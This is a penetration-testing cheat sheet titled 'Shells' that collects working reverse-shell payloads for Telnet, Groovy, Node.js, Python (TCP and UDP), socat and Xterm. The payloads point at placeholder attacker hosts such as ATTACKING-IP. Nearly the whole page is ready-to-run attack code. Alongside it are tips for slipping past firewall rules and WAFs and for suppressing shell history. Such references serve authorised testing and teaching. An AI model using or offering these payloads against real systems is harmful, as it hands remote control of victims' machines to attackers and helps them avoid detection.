---
description: Code Execution
---

# Shells

## Telnet

```text
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```text
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

## Groovy

```java
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

This was sourced from a gist user [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).

## Javascript

The following can be used as a general platform independent reverse shell:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the node.js application from crashing
})();
```

**Source**: [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)  
**Source**: [https://github.com/evilpacket/node-shells/blob/master/node\_revshell.js](https://github.com/evilpacket/node-shells/blob/master/node_revshell.js)

We can also use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate encoded reverse shells.

## Python

There are a myriad of ways to spawn a shell in Python, and for the classic TCP reverse shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Sometimes however, you may need to use an alternate protocol with python, and while the above is a good one-liner it's a bit difficult to work with. I'd recommend using pty, and an excellent source for pty-webshells is [https://github.com/infodox/python-pty-shells](https://github.com/infodox/python-pty-shells).  

An example alternative protocol is a UDP shell, which can be used to bypass firewall rules in some environments:

```python
import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.15.186\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
```

These shells can't be captured with netcat however, you'll have to use socat

```bash
socat file:`tty`,echo=0,raw udp-listen:1234
```

## Xterm

Xterm sessions can also be used to retrieve a shell on a remote device.  This can be useful in cases where you've exploited a VNC instance, or in some cases if a WAF is restricting the character inputs you can do.  One of the benefits of spawning an xterm shell is that it is installed by default and has a short declaration syntax to spawn a shell.

For this you'll need xnest installed and a remote xterm client available. You can set up the listener on your own listener server using one of the following two commands:

```text
Xnest :3 -ac -once -query localhost
Xnest :3 -listen tcp
```

This opens a listener on port 6003, but you can choose any alternative to `:3`

The access control list on your server also needs to be amended to allow access from your machine.

```text
xhost +<remote ip>
```

On the remote machine you can then run:

```text
xterm -display <server ip>:3
```

From this you'll receive a reverse shell.

